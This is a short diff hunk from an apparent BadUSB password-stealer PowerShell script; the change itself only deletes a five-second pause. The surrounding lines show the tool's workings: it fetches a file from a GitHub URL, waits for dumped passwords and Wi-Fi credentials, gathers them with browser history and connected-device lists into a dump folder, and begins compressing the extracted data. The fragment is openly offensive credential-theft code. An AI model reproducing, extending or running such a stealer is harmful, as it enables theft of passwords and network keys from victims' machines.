@@ -30,7 +30,7 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
     Start-Sleep -Seconds 1
 }
-Start-Sleep -Seconds 5
+
 Move-Item passwords.txt, wifi.txt, history.txt, connected_devices.txt -Destination "$dumpFolder"
 
 # Compress extracted data
